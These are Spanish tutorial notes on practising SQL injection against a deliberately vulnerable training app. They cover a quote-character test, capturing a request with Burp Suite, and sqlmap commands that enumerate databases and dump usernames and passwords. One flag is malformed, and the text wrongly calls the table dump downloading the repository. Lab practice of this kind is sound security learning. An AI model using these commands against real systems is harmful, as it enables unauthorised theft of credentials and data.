Las explotaciones manuales son aquellas realizadas a través de las capacidades manuales del atacante y que no derivan del uso de un script. Para practicar, existe el siguiente repositorio de GitHub que contiene ejercicios de inyección SQL:

[https://github.com/appsecco/sqlinjection-training-app](https://github.com/appsecco/sqlinjection-training-app)

Para acceder, el usuario y la contraseña son `admin` y `admin`. Se puede comprobar la vulnerabilidad ingresando una comilla (`'`) en la búsqueda de productos, lo cual puede romper la consulta y permitir la concatenación de otros comandos de inyección SQL.

Este caso se inicializa con la herramienta [[sqlmap]].

Después, se inicializa la aplicación [[Burp Suite]] de la siguiente manera para que quede en segundo plano.

```bash
burpsuite &> /dev/null & disown
```

Posteriormente, activas el proxy en el navegador y realizas una búsqueda para luego recepcionarla con Burp Suite. Una vez hecho esto, seleccionas la opción "Copy to file" y guardas la solicitud en un archivo con extensión `.req`.

Luego, usando la herramienta [[sqlmap]], puedes buscar bases de datos relacionadas con el término que elijas dentro del archivo `.req` con el siguiente comando:

```bash 
sqlmap -r archivo.req -p searchitem --batch
```

Y posteriormente, para que te dumpee las bases de datos existentes, lo haces con el siguiente comando:

```bash 
sqlmap -r archivo.req -p searchitem --batch --dbs
```

Con el siguiente comando, puedes ver los valores de las bases de datos, sus tablas, columnas, etc.

```bash 
sqlmap -r archivo.req -p searchitem --batch --D basededatos -T tabla -C columna --dump 
```

Por ejemplo, así puedes bajar el repositorio de GitHub:

```bash 
sqlmap -r burpsuite.req -p searchitem --batch -D sqlitraining -T users -C username,password,id --dump
```
